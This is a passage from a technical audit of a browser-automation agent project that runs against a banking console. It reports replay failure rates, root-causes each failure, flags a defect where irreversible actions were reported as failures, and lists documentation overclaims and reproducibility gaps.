| **MERIDIAN total** | **13** | **4** | **31%** |

**Replay, MERIDIAN only (70 runs):**

| result | runs | share |
|---|---|---|
| `success` | 33 | **47%** |
| `business_outcome` | 13 | **19%** |
| `failure` | 24 | **34%** |

Per capability, every one of the 8 returned `success` at least once — so
"all 7 target functions live" is defensible in that narrow sense. But the
distribution is lopsided: `meridian_place_hold` is 1 success / 1 outcome / 5
failures; `meridian_open_new_share` is 2 / 1 / 4; `meridian_funds_transfer` is
4 / 4 / 6. `meridian_member_balance` (the discovered one) is 17 / 7 / 5 — by
far the most reliable, which is itself evidence for the discovery loop.

**The gap:** `README.md:31` advertises "10/10 replay stability" and
`DESIGN_DOC.md:214-215` repeats it. That figure is measured against the
**offline fixture**, in a loop, in `evals/run_evals.py`. The MERIDIAN number —
66% reached a defined answer, 34% hard-failed — appears in no document. Some of
those failures are legitimately the environment (shared mutable instance,
concurrent candidates), and some are artifact defects (F.4). Either way, the
honest sentence is "10/10 on the offline fixture; on the live shared target,
47% success / 19% business outcome / 34% hard failure across 70 replays," and
that sentence is more persuasive than the one currently there, because it comes
with a reason for every failure.

### F.4 Observed failure taxonomy — all 24 MERIDIAN hard failures, root-caused

| n | observed | root cause | classification |
|---|---|---|---|
| 9 | `postconditions still unmet at <url>` | step budget (10s) exhausted while the page was already at the right URL — the *heading* postcondition never held | mixed: site latency + brittle heading postconditions |
| 5 | `no rung matched; tried: relative:nearest_input_right of (text='* From Share:') (0 matches)` | the anchor text embeds the required-field asterisk `* From Share:`; when the live page rendered the label without it, every rung produced 0 | **artifact bug** — brittle anchor text |
| 3 | `no dropdown option matches 'Fraud' (match=contains)` | the live reason-code option label did not contain the literal `Fraud` | **artifact bug** — guessed option label, never live-verified (this capability was script-authored, so no recorder proved it) |
| 3 | `anchor text='Share Draft (Checking)' matched 2 visible elements; refusing to choose` | prior #11 | **engine correct, artifact bug** — non-unique anchor, single-rung ladder. Note this hit `meridian_account_inquiry` too, not only `meridian_member_balance`. |
| 2 | `checkpoint unmet at <url>` | see F.5 | **taxonomy gap** |
| 1 | `condition 'cond_session_expired' fired 3 times — recovery cap exhausted` | the session-heal recoverable hit its cap and promoted to FAILURE naming the condition | **engine correct** — and this is the live confirmation of `ADAPTATION.md:58-62`'s claim. VERIFIED. |
| 1 | `intervention unanswered; session closed` | TTL expiry | **engine correct** — the escalation demo at `ADAPTATION.md:65-69`. VERIFIED. |

Two observations worth carrying into any rewrite. First, **11 of 24 failures
(the 5 asterisk-anchor + 3 dropdown-label + 3 ambiguous-anchor cases) are
artifact-authoring defects in capabilities that were never discovered** — the
recorder's whole job is to round-trip every anchor and option against the live
page and refuse the ones that don't hold, and the hand-authored artifacts
bypassed exactly that. That is the strongest evidence in the repo *for* the
discovery loop, and it is currently invisible. Second, the engine behaved
correctly in every one of the 24: it refused, reported, and captured evidence.
There is no instance in 70 runs of a wrong answer returned as `success`.

### F.5 NEW DEFECT · HIGH · the irreversible action landed and the caller was told `failure`

**5 of 70 MERIDIAN replays fired a mutating step and then returned `failure`:**

| run | capability | mutating step | result | observed |
|---|---|---|---|---|
| `20260821T060413Z-meridian_place_hold-8a177f` | place_hold | s13 acted 06:04:17 | failure | `postconditions still unmet at .../members/100234/hold/post` |
| `20260821T060515Z-meridian_place_hold-49a5e5` | place_hold | s13 acted 06:05:17 | failure | `checkpoint unmet at .../members/100234/hold/post` |
| `20260821T060708Z-meridian_update_contact-70272f` | update_contact | s12 acted 06:07:10 | failure | `postconditions still unmet at .../members/100234/update` |
| `20260821T061048Z-meridian_open_new_share-9bd7de` | open_new_share | s12 acted 06:10:51 | failure | `postconditions still unmet at .../open-share/post` |
| `20260821T061140Z-meridian_open_new_share-ef267d` | open_new_share | s12 acted 06:11:43 | failure | `checkpoint unmet at .../open-share/post` |

In every case the browser is sitting on the **POST endpoint** — the form was
submitted. The hold was probably placed; the share was probably opened; the
contact details were probably saved. The caller receives
`{"result":"failure"}` and HTTP **422**.

**Failure scenario:** the chatbot places a hold. The confirmation heading
renders 200 ms after the step budget expires. The caller is told it failed. A
human or an agent retries. The hold is placed **twice** — and the API's
idempotency key would only help if the retry reused it, which a caller told
"this failed" has no reason to do (and which is racy anyway, D-2).

This is the mirror of the question the brief asks ("can a failure be reported
as a success?"). The answer to that one is no. But the inverse — a completed
irreversible action reported as a failure — happens, it happened five times in
one hour of live testing, and the five-way taxonomy has no state for it. The
engine *knows* the risky step acted (it emits `acted` for s12/s13 before the
timeout), so the information exists; it is simply not carried into the result.
A `FailureReport` flag such as `mutation_may_have_landed: true` — set whenever
a `risky` step emitted `acted` before the failure — would let a caller
distinguish "safe to retry" from "verify before retrying," which is the whole
point of labelling steps risky in the first place. **Verdict: CONFIRMED.**

### F.6 Deliverable assets — what the committed artefacts actually show

| asset | tracked | verdict | gap |
|---|---|---|---|
| `docs/screenshots/meridian-console.png` (1600×950) | yes | **CAPTION OVERSTATES IT** | Captioned "The MERIDIAN console — chatbot + live trust dashboard" (`README.md:62`). The chatbot pane is **empty** — no conversation, just the placeholder "ask in plain English — e.g. 'check the balance for member 100234'" and an empty input box. The single visual proof of must-have 3.3 demonstrates zero invocations. |
| " | " | honest, but front-page amber | Every one of the 8 capability cards renders `maker not recorded — four-eyes not verifiable`. The dashboard tells the truth about D-7 — on your README's hero image. |
| " | " | internal inconsistency | Stat cards read `30 / 54` runs and `35 / 54` clean, while the run table below is headed **`EVERY RUN (87)`**. Two different totals for "runs" in one capture. |
| `docs/screenshots/trust-dashboard.png` (1600×5485) | yes | **shows the weak execution record** | The full run list is dominated by `Stopped safely — Something was off — it stopped without acting wrongly, evidence saved` and, at the bottom, a long block of `Recording failed — Learning run that didn't finish — nothing was recorded` (the failed discovery attempts). It also stamps `Recipe changed since — approval unknown for this version ⚠` on the majority of historical rows. A reviewer who opens the full-height image sees the 34% failure rate and the drift, unlabelled and unexplained. |
| `docs/fixture-screenshot.png` (1280×800) | yes | MET | Shows the Fairview fixture as advertised. |
| `agent-hands-defense.pdf` (75 KB) | yes | **STALE** | Built 2026-08-19 17:27. **Zero occurrences of "meridian".** |
| `agent-hands-design.pdf` (136 KB) | yes | **STALE** | Same build, zero "meridian". |
| `agent-hands-report.pdf` (82 KB) | yes | **STALE** | Same build, zero "meridian". |
| `agent-hands-reference.pdf` (258 KB — the largest doc in the repo) | yes | **STALE + UNREPRODUCIBLE** | Zero "meridian". Its source is `docs/build/reference.md` (1031 lines), which is **gitignored** (`.gitignore:17`), as is the `docs/build/build.sh` pipeline. The biggest committed document has no committed source and cannot be regenerated from a clone. |
| PDF coverage | — | **GAP** | There is **no PDF for `docs/ADAPTATION.md` or `docs/ARCHITECTURE_DEEPDIVE.md`** — the two documents that describe the MERIDIAN work. All four PDFs were committed *in* the MERIDIAN commit (`dc14dce`) but were built from pre-MERIDIAN sources two days earlier. Four files sitting at repo root — the most visible position in the tree — tell only the pre-hackathon story. |
| `.github/` | — | **ABSENT** | `docs/DEFENSE.md:258` states "CI runs the schema's load-time validators on merge." There is no `.github` directory and no CI of any kind. Every quality claim rests on someone remembering to run `pytest` locally — which matters more given D-11's flake. |
| `docs/decision-board.html` | no (`.gitignore:19`) | ignored | Not a gap; noting it exists locally only. |
| `evidence/` (15 files) | yes | **fixture-only** | D-5. `evidence/README.md:3-4` is honest — it says "captured 2026-08-14 against the local Fairview Teller fixture app" — so the *evidence dir* does not overclaim. The overclaiming happens in `README.md:32-33` and `ADAPTATION.md`, which cite evidence for MERIDIAN work that has none. |
| `evidence/artifact.json` | yes | minor drift | Signed `reviewed_by: "ashishk"`; the shipped `capabilities/generated/lookup_member_balance.json` is signed `"ashish"`. `evidence/README.md:8` claims "this exact file is what the replay runs below executed" — the signature differs, so it is not byte-identical to the shipped artifact. |

### F.7 Reproducibility and hygiene

| item | verdict | detail |
|---|---|---|
| Secret material committed | **CLEAN** | No `gsk_`/`sk-`/`AKIA` pattern anywhere in tracked content. `.env` is ignored. The brief's "no secrets in repo" is fully met. |
| `.DS_Store` tracked | **CLEAN** | None tracked (two exist locally, correctly untracked). |
| `TODO`/`FIXME`/`XXX`/`NotImplemented` in source | **CLEAN** | Zero across `src/`, `tests/`, `fixture/`, `dashboard/`, `chatbot/`, `scripts/`, `evals/`. |
| `pyproject.toml` | MET | `requires-python >=3.12` matches the README. Lower-bound-only pins, deliberately (`CLAUDE.md:210-213`). |
| "Zero new dependencies. Flask was already in the project for `fixture/`" (`ARCHITECTURE_DEEPDIVE.md:318-320`) | **VERIFIED** | `flask>=3.0` is a main dependency and predates the API. |
| `dashboard/` and `chatbot/` have no `__init__.py` | works | `python -m dashboard.app` resolves via namespace packages; all three run-block modules import cleanly. Not a defect, but it means they are outside `[tool.mypy] files` and outside the wheel. |
| mypy coverage | **GAP** | `files = ["src/hands", "fixture", "tests", "evals"]` — `dashboard/`, `chatbot/` and `scripts/` are **not type-checked**. "mypy strict must stay clean" is true of the library and false of the three surfaces where D-8, D-9, D-15 and D-16 live. |
| ruff coverage | partial | `dashboard/*` and `chatbot/*` are exempted from `E501` only; the rest of the ruleset applies. |
| `capabilities/generated/` has 9 files, `capabilities/requests/` has 3 | **GAP** | 6 artifacts have no request file, so 6 of 9 capabilities cannot be re-discovered or re-derived by anyone — including you, later. |
| `runs/` local hygiene | noted | 95 run dirs and ~250 `.playwright-mcp/` console/page logs accumulated locally (both ignored). Nothing leaks, but nothing is curated either — which is precisely why D-5 happened. |

### F.8 Consolidated gap count

| category | count |
|---|---|
| Confirmed code/behaviour defects (C: D-1…D-23) | 23 (7 HIGH, 12 MEDIUM, 4 LOW) |
| Plausible defect (D-10) | 1 |
| **New confirmed defect this pass (F.5)** | **1 HIGH** |
| Field-level gaps against the 7 functions (F.1) | 4 functions, 5 missing fields |
| Must-have sub-items not met (F.2) | 3 (3.1 discovery, 3.3 escalation reporting, 3.5 escalation through wrapper) |
| Must-have sub-items partial (F.2) | 3 (3.4 evidence on clone, 3.5 allowlist, 3.5 PII) |
| Brief exceptional states with no recognizer (A.3) | 5 (maintenance 503, server 500, bad login, invalid email/phone, injected 403) |
| Falsifiable doc claims FALSE (B) | 17 |
| Falsifiable doc claims OVERCLAIM (B) | 6 |
| Falsifiable doc claims UNVERIFIABLE-OFFLINE (B) | 3 |
| Asset/deliverable gaps (F.6) | 7 (1 caption, 1 inconsistency, 4 stale PDFs, absent CI) |
| Reproducibility gaps (F.7) | 3 (unreproducible reference PDF, 6 missing request files, 3 dirs outside mypy) |
| **Total distinct gaps** | **~70** |

**Total HIGH-severity defects: 8** — D-1 (tail-editable audit log), D-2
(idempotency race), D-3 (page-scoped allowlist), D-4 (failure relabelled as
policy violation), D-5 (no committed MERIDIAN evidence), D-6 (no fingerprint on
outputs/regions), D-7 (escalation unreachable through the wrapper), and F.5
(irreversible action reported as failure).

If you fix only three things, fix D-5 (one hour: copy six run dirs into
`evidence/meridian/`), F.5 (one flag on `FailureReport`), and D-2 (move two
lines inside the lock). Those three convert the most claim-surface per unit of
effort, and F.5 is the one a banking CTO would ask about first.
